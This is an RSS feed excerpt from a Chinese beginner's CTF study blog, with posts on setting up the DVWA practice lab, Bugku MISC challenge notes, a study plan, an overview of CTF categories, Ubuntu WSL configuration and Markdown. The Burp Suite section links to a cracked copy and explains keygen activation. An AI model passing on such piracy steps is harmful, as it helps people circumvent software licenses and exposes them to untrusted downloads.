 DVWA运行基于LAMP（Linux+Apache+MySQL+PHP），出于时间和个人能力的考虑，很难成功地从0开始搭建这样一套体系，故而使用小皮的PHPStudy环境。
PHPStudy：https://www.xp.cn/
DVWA：http://www.dvwa.co.uk/
一、安装PHP Study 二、配置DVWA 将下载的DVWA压缩包解压到PHP Study的WWW目录下并解压，进入目录中的config文件夹，编辑config.inc.php文件，找到_DVWA[&#39;db_password&#39;]=&#39;root&#39;行，将user改为‘root’；password改为‘root’。
三、配置PHP Study 开启Apache和PHP服务，点击左边栏网站，左上角创建网站，域名为设置为本机本地域名，查看本地域名方法：进入powershell输入命令ipconfig查看，我电脑本机域名为192.168.0.104
为什么不设置为localhost 127.0.0.1：Burp Suite配合chrome浏览器抓包时可能无法拦截localhost的数据。
根目录指向刚刚解压的DVWA-master目录下，点击确认，网站创建成功。
四、浏览器进入192.108.0.104 点击Create/Reset Database创建数据库
用户名：admin 默认密码：password
登陆进入后即部署成功。
BurpSuite2.1安装  BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。
 1. JDK及BurpSuite破解版下载 链接：https://pan.baidu.com/s/11lrFGT0aGCd4BQcAJrL55w 提取码：w5lg
2. 配置JAVA环境 安装好jdk后，右键计算机-属性-系统设置-高级-环境变量
新增两个环境变量
  %JAVA_HOME%=jdk安装文件夹所在位置，如...\jdk1.8.0_201
  %CLASSPATH%=.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar
  修改path变量，分别添加jdk和jre安装文件夹下的bin目录。
3. 激活BurpSuite jdk配置完毕后，先打开burp-loader-keygen.jar文件
点击run
将license许可证复制入弹出的框中，点击Next，选择Manual activation手动激活。
将生成的申请码粘贴入注册机中，自动算号，将生成的激活码复制入框中，点击Next即激活成功。
此后想打开Burp Suite，双击运行目录下的VBS脚本即可。
BurpSuite Chrome配置 1. 设置流量代理Proxy ​	在谷歌应用商店中安装Falcon Proxy，添加一个新的代理127.</description>
    </item>
    
    <item>
      <title>MISC类型题目及技巧</title>
      <link>https://shenyimings.github.io/post/6.bugku_misc/</link>
      <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/6.bugku_misc/</guid>
      <description>图片隐写  图片EXIF信息 GIF图片 文件头 16进制编码  编码 Readflag
社工   Bugku社工_进阶收集
根据题目给出的说说截图，有如下信息：
 终点位置突出特征：有塔      坐地铁需要7站，中间还要转一站
 出发站为始发站 家位置在始发站和第二站的中间位置  根据以上信息，先对说说配图进行百度识图，查找到地理位置为西安大雁塔，对照西安地铁图，距离大雁塔站有7站且为始发站的站点只有韦曲南站，至此即可确定小美所住的小区在韦曲南站和航天城站之间，利用百度地图标尺画两个圆，可以大致确定符合条件的7家小区，挨个尝试可得flag。
   Bugku_隐写)
题目文件为一张PNG格式图片，Windows自带图片浏览器无法正常打开该图片，说明图片内容经过人为篡改。使用工具TweakPng查看png内容，将图片大小的chunk部分高度修改为宽度一致，500px，保存，图片flag得以正常显示。
正常做法：用Python脚本计算和图片大小相匹配的正常宽高，再利用Tweakpng查看并修改。
  </description>
    </item>
    
    <item>
      <title>暑假CTF学习计划</title>
      <link>https://shenyimings.github.io/post/4.%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</link>
      <pubDate>Thu, 22 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/4.%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</guid>
      <description>学习内容 根据上一篇笔记选择的比赛方向：Web和Crypto，安排并希望在假期进行以下内容的学习：
  Python编程基础-网络编程，并提升Python的水平取代C++成为自己最熟练的编程语言。
  Linux系统学习（基于Ubuntu 18.04）目标：建站
  SQL注入（SQL基本语法）
  PHP基本语法
  学习计划 假期苦短，每天效率也不高，单纯的看视频/看书想必毫无持续性，故而学习务必要结合实例，如我将《Learn Python 3 the HARD WAY》这本书作为Python的入门书籍，书中有大量例子，一个一个做下去有成就感推动前进，又能很好的掌握基础知识。
   7.23-8.5 学习python 完成抓包项目     8.6-8.10 学习LINUX系统 BUGKU站刷题   8.11-8.15 Linux系统实战-建站   8.16-8.27 学习SQL注入相关知识    </description>
    </item>
    
    <item>
      <title>CTF比赛方向选择</title>
      <link>https://shenyimings.github.io/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/</link>
      <pubDate>Wed, 21 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/</guid>
      <description>了解CTF  CTF 的前身是传统黑客之间的网络技术比拼游戏，起源于 1996 年第四届 DEFCON。CTF比赛有以下突出特点：
 比赛侧重于对计算机底层和系统安全的核心能力，Web 漏洞攻防技巧完全被忽略。 竞赛环境趋向多 CPU 指令架构集，多操作系统，多编程语言。 采用「零和」计分规则。 团队综合能力考验：逆向分析、漏洞挖掘、漏洞利用、漏洞修补加固、网络流量分析、系统安全运行维护以及安全方面的编程调试。   CTF竞赛内容 常见六个分类
  Web - 网络攻防
考察Web安全中的常见漏洞，如SQL注入、XSS、CSRF、文件包含、文件上传、代码审计。Web安全题型最为常见。
  RE - 逆向工程
反编译、软件保护、反调试、软件加壳脱壳。
  PWN - 二进制漏洞
与计算机操作系统底层相关，主要出现在Linux平台上。
  Crypto - 密码学
古典密码与现代密码学安全两方面
  Mobile - 移动安全
安卓逆向相关
  MISC - 安全杂项
信息搜集（社工）、编码分析、取证分析、隐写分析等
  比赛学习方向选择 基于我个人对于六个分类的了解，我选择Web方向与Crypto方向。
  Web
作为一个尝试过Minecraft自建服务器、外网vps搭梯子（学习用）、购置域名建WordPress小站、提取视频网站M3U8下载地址的ctf beginner，Web方向是我最为感兴趣和想学习的方向，也是我认为最有应用性和最能获得成就感的方向。Web方向知识面的广度很宽，涉及范围相当大，故而学习需要恒心。
  Crypto
选择这个方向的原因很简单，我是目前所读专业即为信息安全（密码学方向） 故而此方向与学科所学相关，虽难但也必须披荆斩棘，筚路蓝缕。
  次要方向：PWN</description>
    </item>
    
    <item>
      <title>Ubuntu 18.04 LTS的配置与入门</title>
      <link>https://shenyimings.github.io/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/</link>
      <pubDate>Tue, 20 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/</guid>
      <description>系统选择 Linux有多种发行版，作为一名小白，我选择Ubuntu的原因是以前用过并且感觉桌面界面十分讨喜，再者，Ubuntu作为常见的个人桌面操作系统，使用人数相对较多，教程也更多，对萌新十分友善。
载体 最标准的方式当然是重装系统咯，总是佩服小时候爱捣鼓的自己，想格盘就格盘，说重装就重装了，长大以后，不知是懒了还是如何，很难再去断舍离了，只能继续看着又快满的C盘抱残守旧了，单系统不可取，双系统也要重新给硬盘分区，过于麻烦，那就传统的VMware虚拟机吧，在去Ubuntu官网下载镜像时，发现了一个全新的选择：Windows WSL，即Windows Subsystem for Linux，籍此可以直接在Windows 10上运行Ubuntu，安装便捷，启动快速，就决定是你了！
系统配置（学习网址：CSDN博客）  安装好后首先设置root用户, 更换apt数据源  sudo passwd root su root cd /etc/apt cp sources.list sources.list.bak #备份配置文件 vim sources.list #编辑配置文件 将配置文件内容更改为阿里云镜像源  deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.</description>
    </item>
    
    <item>
      <title>学习Markdown语法</title>
      <link>https://shenyimings.github.io/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/</link>
      <pubDate>Mon, 19 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://shenyimings.github.io/post/1.markdown%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/</guid>
      <description>2021年7月18日 了解Markdown Markdown是一种轻量级标记语言，属于HTML格式的一种，易读易写易更改，处处透着极简主义的影子。在GitHub等网站上使用极广，更可以跨平台使用。
Windows桌面端软件选择 Web网页版有简书等知名博客网站可作记录，千挑万选后我选择了Typora。优点如下：
 有中文版。这一点可能不足为道，因为菜单的语言并不影响我们的使用，然而，不支持中文意味着软件对中文输入法的适配甚至中文文本的显示都极为差劲，这一点是我由MarkdownPad的使用中发现的。 Typora支持即时渲染技术，非常方便新人学习熟练。 Typora可以将md文件导出为pdf格式作发布用，对于笔记爱好者来说成就感满满。  Markdown语法  区块引用
 代码引用：
printf(&amp;quot;使用反引号包裹代码&amp;quot;)
int main() { int a; scanf(&amp;#34;%d&amp;#34;,&amp;amp;a); printf(&amp;#34;%d&amp;#34;,a++); return 0; } emoji: :smile:
公式： $$ lim_{x \to\infty} \exp(-x) = 0 $$ 插入图片：</description>
    </item>
    
  </channel>
</rss>
